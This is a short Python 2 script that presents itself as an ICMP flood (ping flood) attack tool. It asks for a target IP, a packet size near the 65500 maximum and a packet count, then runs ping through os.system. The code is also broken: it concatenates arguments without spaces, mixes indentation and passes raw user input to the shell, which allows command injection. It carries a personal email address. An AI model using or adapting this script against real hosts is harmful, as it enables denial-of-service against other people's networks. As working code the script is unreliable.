

# This is python script for peforming the icmp flood attack 

# 789sk.gupta@gmail.com 


    
# icmp_ping for defragmentation of the network packets


import os
import sys # system commands exexution module 


import time
# import socket


def icmp_startattack():

    hostip = raw_input("target system's ip address")
  
    ippacketData = input("Enter the size of each of the ip packet")
    number = input("Enter the number of packets to sent")
    # recommended size 65500 which is max available for ip packet 
    
	
    print "Attacking the target with crafted icmp packets" 
    # execution of the attack in the shell 
    #    t = time.time()
	os.system("ping" + hostip + "-l" + ippacketData + "-n" + number)
	
   # os.popen("ping 192.168.43.1 -w 1 -n 2")
        
    # os command to start attack 
    # where n points to time b/w per echo request and reply 
    # and n points to the number of packets with which every icmp request is to be sent to the h

	

icmp_startattack()  # called the main attack execution function 

print "Attack finished"
#temporarily program ends 

